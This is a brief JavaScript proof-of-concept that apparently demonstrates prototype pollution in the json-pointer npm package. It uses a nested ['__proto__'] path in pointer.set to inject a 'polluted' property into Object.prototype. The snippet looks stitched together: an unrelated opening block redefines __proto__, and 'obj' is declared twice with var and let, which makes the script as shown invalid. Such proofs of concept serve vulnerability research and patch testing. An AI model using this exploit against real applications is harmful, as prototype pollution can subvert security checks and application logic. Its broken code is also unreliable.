var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const pointer = require('json-pointer');
let obj = {};
console.log({}.polluted);
pointer.set(obj, [
    ['__proto__'],
    'polluted'
], 'yes');
console.log({}.polluted);